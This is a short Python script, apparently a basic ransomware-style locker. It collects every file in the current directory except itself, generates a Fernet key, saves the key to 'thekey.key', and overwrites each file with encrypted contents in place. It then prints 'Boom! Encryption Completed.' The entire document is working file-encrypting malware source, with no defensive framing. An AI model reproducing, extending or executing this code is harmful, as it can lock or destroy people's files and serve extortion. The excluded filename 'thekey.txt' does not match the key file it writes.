import os

from cryptography.fernet import Fernet

files = []

for file in os.listdir():
    if file == "voldemort.py" or file == "thekey.txt":
        continue
    if os.path.isfile(file):
        files.append(file)

print(files)
key = Fernet.generate_key()

with open("thekey.key","wb") as thekey:
    thekey.write(key)

#Encryption starts

for file in files:
    with open(file,"rb") as data:
        content = data.read()
    encrypted_content = Fernet(key).encrypt(content)
    with open(file, "wb") as edata:
        edata.write(encrypted_content)

print("Boom! Encryption Completed. Please check the files now.")